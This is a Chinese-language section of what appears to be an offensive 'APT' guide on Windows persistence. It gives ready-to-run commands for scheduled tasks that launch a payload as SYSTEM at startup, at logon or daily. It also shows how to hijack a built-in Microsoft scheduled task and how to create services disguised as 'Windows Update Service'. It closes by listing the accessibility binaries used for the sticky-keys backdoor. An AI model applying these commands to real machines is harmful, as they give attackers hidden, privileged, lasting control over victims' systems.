### Windows持久化

1. DLL劫持

参考[DLL劫持](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Readme.md#dll%E5%8A%AB%E6%8C%81)

2. 计划任务

```bash
schtasks /create /tn "MaliciousTask" /tr "C:\Users\Administrator\Desktop\test\payload\file\hi.exe" /sc ONSTART /ru SYSTEM
schtasks /query /TN MaliciousTask /XML
schtasks /create /tn "MaliciousTaskDaily" /tr "C:\Users\Administrator\Desktop\test\payload\file\hi.exe" /sc DAILY /st 09:00 /ru SYSTEM
```

PowerShell:

```bash
$Action = New-ScheduledTaskAction -Execute "C:\malicious.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Settings = New-ScheduledTaskSettingsSet
$Settings.ExecutionTimeLimit = "PT0S"
Register-ScheduledTask -TaskName "MaliciousTaskLogon" -Action $Action -Trigger $Trigger -User "SYSTEM" -Settings $Settings
```

```bash
schtasks /delete /TN "MaliciousTask" /F
Unregister-ScheduledTask -TaskName "MaliciousTask" -Confirm:$false
```

```bash
SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\Users\Administrator\Desktop\test\payload\file\hi.exe" /RL HIGHEST /RU SYSTEM /ENABLE
```

3. 创建服务

```bash
sc create MaliciousService binPath= "C:\hi.exe" start= auto obj= LocalSystem DisplayName= "Windows Update Service"
or
New-Service -Name "MaliciousServicePS" -BinaryPathName "C:\malicious.exe" -Description "Windows Update Service" -StartupType Automatic
```

```bash
sc start MaliciousService
sc delete MaliciousService
```

4. 辅助功能

辅助功能的可执行文件位于C:\Windows\System32目录下，辅助功能的可执行文件如下所示:
+	屏幕键盘：osk.exe。用于在屏幕上显示虚拟键盘。在运行中的Windows系统中，可以通过在“运行”对话框中输入osk并按回车键来启动。
+	放大镜：Magnify.exe。用于放大屏幕内容，键入WIN+=可快速启动。
+	轻松访问：Utilman.exe。用于管理各种辅助功能，键入WIN+U可快速启动。
+	讲述人：Narrator.exe。一种屏幕阅读器，用于朗读屏幕上的文本，键入WIN+回车可快速启动。
+	屏幕切换：DisplaySwitch.exe。切换不同的显示模式，键入WIN+P可快速启动。
+	粘滞键：sethc.exe。帮助那些难以同时按下多个组合键（例如 Ctrl + Alt + Delete）的用户。开启粘滞键后，用户可以依次按下每个键，而不是同时按下，键入五次SHIFT可快速启动。
